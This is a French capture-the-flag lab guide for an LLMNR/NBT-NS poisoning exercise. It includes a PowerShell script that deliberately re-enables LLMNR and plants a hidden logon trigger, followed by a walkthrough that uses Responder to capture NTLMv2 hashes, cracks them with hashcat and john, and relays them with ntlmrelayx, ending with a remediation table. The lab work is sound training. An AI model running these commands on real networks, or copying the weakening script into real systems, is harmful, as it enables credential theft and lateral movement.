# Flag 6 — LLMNR Poisoning

> **Technique :** LLMNR/NBT-NS Poisoning → Capture de hash NTLMv2
> **Machine de déploiement :** WS01 ET WS02
> **Machine d'exploitation :** Machine attaquante Linux (Kali/Parrot) sur VMnet2
> **Compte de départ :** `CTF\lowpriv` / `User@1234`
> **Difficulté :** Intermédiaire

---

## Déploiement

### Prérequis

Ajouter une machine attaquante Linux (Kali ou Parrot) sur le réseau VMnet2 :

| Paramètre | Valeur |
|---|---|
| Réseau | VMnet2 (Host-only) |
| IP | 192.168.10.50 |
| Outil requis | Responder (`sudo apt install responder`) |

### Script — Flag6-LLMNR.ps1

> [!warning] Lancer en PowerShell Admin sur WS01 ET WS02

```powershell
#Requires -RunAsAdministrator

Write-Host "`n[FLAG 6] LLMNR actif (lancer sur WS01 ET WS02)" -ForegroundColor Cyan

# --- 1. Activer LLMNR via registre ---
$llmnrKey = "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient"
if (-not (Test-Path $llmnrKey)) {
    New-Item -Path $llmnrKey -Force | Out-Null
}
Set-ItemProperty -Path $llmnrKey -Name "EnableMulticast" -Value 1 -Type DWord
Write-Host "  [+] LLMNR active (EnableMulticast=1)" -ForegroundColor Green

# --- 2. Activer NBT-NS sur la carte reseau ---
$adapters = Get-WmiObject Win32_NetworkAdapterConfiguration |
    Where-Object { $_.IPEnabled -eq $true }
foreach ($a in $adapters) {
    $a.SetTcpipNetbios(1) | Out-Null
    Write-Host "  [+] NetBIOS over TCP/IP active : $($a.Description)" -ForegroundColor Green
}

# --- 3. Declencheur logon : hostname inexistant -> declenche LLMNR ---
$triggerPath = "C:\ProgramData\CTF\llmnr_trigger.ps1"
New-Item -ItemType Directory -Path "C:\ProgramData\CTF" -Force | Out-Null
@"
# Declencheur LLMNR - s execute au logon
# fileserver-ctf n existe pas dans le DNS -> Windows tente LLMNR sur le reseau local
net use X: \\fileserver-ctf\share /persistent:no 2>nul
"@ | Set-Content -Path $triggerPath -Encoding UTF8

$regPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
Set-ItemProperty -Path $regPath -Name "CTF-NetworkMapping" `
    -Value "powershell.exe -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$triggerPath`""
Write-Host "  [+] Declencheur LLMNR ajoute au logon" -ForegroundColor Green

# --- 4. Verifications ---
Write-Host "`n  [*] Verification LLMNR :" -ForegroundColor Yellow
Get-ItemProperty $llmnrKey -Name EnableMulticast
Write-Host "`n  [*] Verification cle Run :" -ForegroundColor Yellow
Get-ItemProperty $regPath -Name "CTF-NetworkMapping"

Write-Host "`n[FLAG 6] DONE" -ForegroundColor Green
Write-Host "  SNAPSHOT : $env:COMPUTERNAME - Flag6 deploye" -ForegroundColor Yellow
```

---

### Vérification du déploiement

> [!warning] Depuis PowerShell Admin sur WS01 et WS02

```powershell
# Verifier LLMNR
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient" -Name EnableMulticast
# Attendu : EnableMulticast = 1

# Verifier le declencheur logon
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "CTF-NetworkMapping"
# Attendu : chemin vers llmnr_trigger.ps1
```

> [!success] Snapshots
> **`WS01 — Flag6 déployé`**
> **`WS02 — Flag6 déployé`**

---

## Write-up

### Contexte

LLMNR (Link-Local Multicast Name Resolution) est un protocole de résolution de noms utilisé en fallback quand le DNS ne répond pas. Quand une machine tente de résoudre un hostname inexistant, elle envoie une requête broadcast LLMNR sur le réseau local. Un attaquant peut répondre à cette requête en se faisant passer pour la machine demandée, forçant la victime à s'authentifier et révélant son hash NTLMv2.

---

### Prérequis

- Machine attaquante Kali/Parrot connectée sur VMnet2 (192.168.10.50)
- Responder installé : `sudo apt install responder`

---

### Exploitation

#### Étape 1 — Lancer Responder sur la machine attaquante

```bash
sudo responder -I eth0 -wrf
```

Laisser Responder en écoute et attendre.

#### Étape 2 — Déclencher la résolution LLMNR

Se connecter sur WS01 ou WS02 avec `CTF\lowpriv` / `User@1234`. Le script de logon tente automatiquement de mapper `\\fileserver-ctf\share`. Ce hostname n'existe pas dans le DNS → Windows émet une requête LLMNR sur le réseau local → Responder répond et capture le hash NTLMv2.

#### Étape 3 — Lire le hash capturé dans Responder

**Résultat dans le terminal Responder :**

```
[SMB] NTLMv2-SSP Client   : 192.168.10.20
[SMB] NTLMv2-SSP Username : CTF\lowpriv
[SMB] NTLMv2-SSP Hash     : lowpriv::CTF:1122334455667788:AABBCCDDEEFF...
```

Le hash est aussi enregistré dans :

```bash
cat /usr/share/responder/logs/SMB-NTLMv2-SSP-192.168.10.20.txt
```

#### Étape 4 — Cracker le hash hors ligne

```bash
# Avec hashcat
hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

# Avec john
john --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2 hash.txt
```

**Résultat :**

```
lowpriv::CTF:... : User@1234
```

---

### Récupération du flag

Le hash NTLMv2 capturé **est** le flag de cet exercice. Selon la règle définie :

- **Option A** — le hash brut capturé valide le flag
- **Option B** — le mot de passe cracké `User@1234` valide le flag

Le hash cracké peut ensuite être utilisé pour s'authentifier sur d'autres services du domaine avec les credentials de `lowpriv`.

---

### Aller plus loin — Relais NTLM

Au lieu de cracker le hash, on peut le relayer directement vers une autre machine :

```bash
# Desactiver SMB et HTTP dans Responder.conf avant de lancer
sudo responder -I eth0 -wd

# Dans un autre terminal, lancer ntlmrelayx
sudo impacket-ntlmrelayx -t 192.168.10.10 -smb2support
```

---

### Remédiation

| Problème | Correction |
|---|---|
| LLMNR activé | Désactiver via GPO : `Computer Configuration > Administrative Templates > Network > DNS Client > Turn off multicast name resolution = Enabled` |
| NBT-NS activé | Désactiver via les propriétés de la carte réseau ou via DHCP option 001 |
| Mots de passe faibles | Politique de mots de passe complexes — `User@1234` ne doit pas être dans rockyou.txt |
| Pas de détection | Déployer un honeypot LLMNR pour détecter les poisoners sur le réseau |

---

### Résumé de la chaîne d'exploitation

```
Attaquant (Kali)
  └─→ sudo responder -I eth0 -wrf → écoute sur VMnet2

lowpriv se connecte sur WS01/WS02
  └─→ script logon → net use \\fileserver-ctf\share
        └─→ DNS : hostname inconnu → fallback LLMNR broadcast
              └─→ Responder répond → victime s'authentifie
                    └─→ hash NTLMv2 capturé : lowpriv::CTF:...
                          └─→ hashcat -m 5600 → User@1234
```
